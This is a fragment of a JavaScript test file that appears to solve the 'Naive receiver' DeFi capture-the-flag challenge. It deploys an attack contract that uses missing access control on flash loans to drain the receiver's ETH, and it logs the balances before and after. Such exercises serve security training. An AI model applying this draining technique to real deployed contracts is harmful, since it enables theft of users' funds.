...
describe("[Challenge] Naive receiver", function () {
  ...
  it("Execution", async function () {
    ...
    // Lac of acess control, anyone can Make a flashLoan call to drain all ETH on Receiver.

    const VaultBalanceBefore = ethers.utils.formatEther(
    ...
    const ETH = await pool.ETH();
    const attackNaiveFactory = await ethers.getContractFactory(
      "AttackNaiveReciver",
      player
    );

    const attackNaive = await attackNaiveFactory.deploy();
    console.log("Attackkkkk!");
    await attackNaive.attack(pool.address, receiver.address, ETH, 0, "0x");

    const VaultBalanceAfter = ethers.utils.formatEther(
      await ethers.provider.getBalance(pool.address)
    );
